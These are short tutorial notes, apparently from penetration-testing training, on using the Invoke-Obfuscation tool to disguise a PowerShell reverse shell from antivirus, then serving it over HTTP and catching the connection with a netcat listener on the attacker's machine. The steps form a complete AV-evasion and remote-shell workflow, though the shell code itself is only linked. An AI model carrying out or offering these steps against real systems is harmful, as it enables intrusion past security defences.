## Invoke-obfuscation
* An open source Powershell v2.0+ compatible powershell command and script obfuscator.
* `github.com/danielbohannon/Invoke-Obfuscation`

* PRACTICAL
* Clone the repo "Invoke-Obfuscation" into the folder of your choice

 
* **How to run powershell on a Linux system**
* `sudo apt-get install powershell -y`
* `pwsh` --> Launch powershell.
* Navigate into the cloned repo
* `Import-Module ./Invoke-Obfuscation.psd1`
* Navigate to the "Invoke-Obfuscation" folder
* Reverse shell code that we will be using:
  * `https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell`
  * Pick the code with -nop option. Copy it
  * Open a text editor.
  * Get rid of `powershell -nop -c` and "" from both the sides of the copied code.
  * Change the attacker's IP and port
  * Rename it to `shell.ps1`
 
* Back to the terminal
  * `SET SCRIPTPATH /home/kali/Desktop/AVBypass/shell.ps1`
  * `AST` --> `ALL`
  * Save it as 'obfuscated.ps1`
  * `exit` from Powershell
 
* On the attacker:
  * `nc -nvlp 1234`
 
* In another terminal:
  * `sudo python3 http.server 80`
 
* On the target: Open the attacker IP in a browser:
* Download --> Execute
* This should start a reverse shell on the Netcat listener back on the attcker.
